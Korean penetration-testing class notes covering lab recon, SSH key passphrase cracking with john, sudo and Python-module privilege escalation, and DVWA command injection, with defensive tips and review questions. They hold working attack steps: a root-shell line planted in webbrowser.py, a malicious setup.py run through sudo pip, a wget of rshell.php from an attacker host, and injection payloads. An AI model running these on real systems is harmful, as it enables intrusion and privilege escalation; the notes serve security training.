# 2026-09-22 · 정찰 복습 · SSH키 크랙(john) · linPEAS · CVE 권한상승 · DVWA Command Injection

> 원본: [original/Notes_260922_124935_1.pdf](original/Notes_260922_124935_1.pdf)
>
> ⚠️ 교육용 취약 실습 머신/DVWA 대상 기록. 방어 관점과 함께 정리한다. 실제 시스템 대상 사용 금지.

## 1. 정찰 복습
```bash
nmap <target>           # port scan → 22, 80 열림, ~myfiles 경로 확인
# gobuster로 192.168.16.56/____/ 하위 확인
```
- `/~myfiles/` → 404, `/~FUZZ/` 사용자 스캔 → `/~secret/` 발견.
- **nikto / dirb / dirbuster / wpscan** → 웹서버 취약점·경로 스캔 도구들.
```bash
sudo ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
  -u "http://192.168.16.56/~secret/_FUZZ" -t 200 -c -e .py,.rar ... -ic -fc 403
   # -e 확장자, -fc 403: 403 응답 필터
```

## 2. 인코딩 + SSH 키 크랙
- `base58`로 decode(디코딩) 후 SSH 키 확보.
```bash
sudo ssh2john victim_id_rsa > hash_pw
sudo john --wordlist=/usr/share/wordlists/fasttrack.txt hash_pw
   # fasttrack 사전으로 패스프레이즈 크랙
```

## 3. 권한 상승 ①: sudo 오설정
```bash
sudo -l                 # sudo로 실행 가능한 명령 탐색
   # → /home/arsene/heist.py 사용 가능(이 경로의 파이썬을 root로 실행 가능)
```

## 4. 권한 상승 ②: linPEAS로 점검 자동화
```bash
wget https://.../linPEAS.sh
chmod +x linpeas.sh
./linpeas.sh            # 권한상승 취약점 탐색 자동 스크립트
```
- 출력에서 **CVE-(번호)**: 공개로 알려진 취약점 번호 → 커널/소프트웨어 버전에 맞는 PoC 확인.

## 5. 권한 상승 ③: 쓰기 가능한 모듈 하이재킹
root로 실행되는 파이썬(`heist.py`)이 `import webbrowser` 한다면, **webbrowser 모듈을 변조**:
```bash
sudo vi /usr/lib/python3.9/webbrowser.py
   # 파일에 추가:
   import threading
   os.system("/bin/bash")       # 모듈 로드 시 root 셸 실행
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
   # heist.py 실행 → webbrowser import 시 /bin/bash 실행
```
- `sudo -l`에서 `pip`를 no password로 쓸 수 있으면 **pip install로 임의 코드 실행**:
```bash
TF=$(mktemp -d)
echo "import os; os.system('/bin/sh -c ...')" > $TF/setup.py   # 악성 setup.py
sudo pip install $TF           # root 권한으로 setup.py 실행
```
- 방어: `sudo` 대상에 인터프리터/pip를 넣지 말 것, 파이썬 모듈 경로 쓰기권한 점검, 최소 권한.

## 6. 파일 전송 (대상이 인터넷 안 될 때)
```bash
# 공격자(host)에서
sudo python -m http.server    # 현재 디렉터리 공유(기본 8000)
# 대상에서
wget http://192.168.16.11:8000/rshell.php
```

## 7. DVWA — Command Injection
입력값에 **명령어를 연결해 다른 명령도 함께 실행**시키는 취약점.
- **low**: 입력을 그대로 셸에 전달 → `; id`, `| whoami` 등이 실행됨.
- **medium**: `&&`·`;` 등 일부 토큰을 치환/제거 → 우회(다른 연산자·인코딩) 시도.
- 방어: 셸 호출 대신 인자 배열 실행, 입력 화이트리스트, `escapeshellarg()`.

## 8. 정정·보충
- 모듈 하이재킹은 **파이썬 모듈 검색 경로(sys.path)** 우선순위를 악용 — 쓰기 가능한 디렉터리가 앞에 있으면 더 쉬움.
- `ssh2john` + `john`은 키 패스프레이즈 크랙용. 패스프레이즈가 강하면 실패한다(강한 암호가 방어).
- linPEAS/LinEnum 같은 자동 점검 도구는 공격·방어 양쪽에서 쓰인다(방어자는 사전 점검용).

## 9. 복습 질문
1. `sudo -l` 결과에 pip/python이 있으면 왜 위험한가?
2. 파이썬 모듈 하이재킹이 성립하는 조건은?
3. Command Injection의 low와 medium 방어 차이, 그리고 근본 대응은?
4. 대상이 인터넷이 안 될 때 파일을 옮기는 방법은?
